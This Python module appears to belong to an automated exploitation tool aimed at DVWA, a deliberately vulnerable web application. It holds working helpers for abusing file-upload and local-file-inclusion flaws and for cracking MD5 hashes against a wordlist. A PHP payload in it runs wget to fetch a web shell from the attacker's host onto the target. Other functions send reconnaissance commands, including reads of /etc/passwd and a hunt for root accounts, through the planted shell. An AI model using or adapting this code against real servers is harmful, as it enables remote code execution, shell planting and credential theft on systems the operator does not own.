
import requests
import random
import hashlib
from urllib.parse import urljoin , urlparse , urlencode


def random_shell_name():
    return str(random.randint(11111,99999)) + '.php'

def crack_hash(hash):
    for password in open('tools/lists/password.lst').readlines():
        password = password.strip()
        hash2 = hashlib.md5(password.encode('utf-8')).hexdigest()
        if hash == hash2: 
            return password

    return None    

def upload_file(url,cookies,fileName,content,content_type = None):
    # this function will used by upload vulnerability and lfi exploit

    upload_url = urljoin(url,"vulnerabilities/upload/")
    headers = makeHeaders(urlparse(url).hostname)

    if content_type:
        res = requests.post(upload_url,cookies=cookies,headers=headers,files={'uploaded' : (fileName,content,content_type)},data={'Upload':'Upload'})
    else:
        res = requests.post(upload_url,cookies=cookies,headers=headers,files={'uploaded' : (fileName,content)},data={'Upload':'Upload'})

    return 'succesfully uploaded!' in res.text

def lfi_request_file(url,cookies,headers,file):
    # this function will used by LFI functions and SQLi to_rce2 function

    vulnerable_path = f"vulnerabilities/fi/?{urlencode({'page' : file})}"
    full_url = urljoin(url,vulnerable_path)
    return requests.get(full_url,cookies=cookies,headers=headers)

def wget_payload(lhost,lport,shell_name):
    return f"wget http://{lhost}:{str(lport)}/tools/shell.php -O {shell_name}"

def php_payload(lhost,lport,shell_name):
    return f"<?php system('{wget_payload(lhost=lhost,lport=lport,shell_name=shell_name)}'); ?>"

def php_shell():
    with open('tools/shell.php') as shellcode:
        return shellcode.read()


def makeHeaders(
    hostname,
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; rv:54.0) Gecko/20100101 Firefox/54.0'
):
    return {
        'Host': hostname,
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'keep-alive'
    }


def random_command():
    commands = [
        'uname','uname -a','uname -r','w','who','ps','head -2 /etc/passwd','date',
        'php -r \'echo "Hello World From php l000l *_*";\'','id','cat /etc/resolv.conf',
        'lsmod','cat /proc/cpuinfo','cat /proc/meminfo','cat /proc/meminfo',
        'for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done',
        'cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk \'{print $1}\''
    ]

    return f"whoami ; echo \"|\" ; hostname ; echo \"|\"; pwd ; echo \"|\"; {commands[random.randint(0,len(commands)-1)]}"


def print_command_output(command,output,end = "\t\t"):
    uname , hname , path , command_output = output.split('|')
    print(f"{end}{uname.strip().split('</form>')[-1]}@{hname.strip()}:{path.strip()}#{command}")
    print( f"{end}\t" + command_output.replace('\n',f"\n{end}\t").strip())


def check_exploit_succeed(shell_path,headers,end = "\t\t"):
    cmd = random_command()
    res = requests.get(shell_path + f"?{urlencode({'cmd' : cmd})}",headers=headers)

    if res.status_code == 200:
        print("\t\tExploit Succeed")
        print(f"\t\tShell path : {shell_path}")
        command = cmd.split(';')[6:]

        # if our random command is multiple commands separated by simicolon will be splitted
        # therefore we must rejoin them

        command = ';'.join(command)
        print_command_output(command,res.text)

    else:
        print("\t\tExploit Failed")
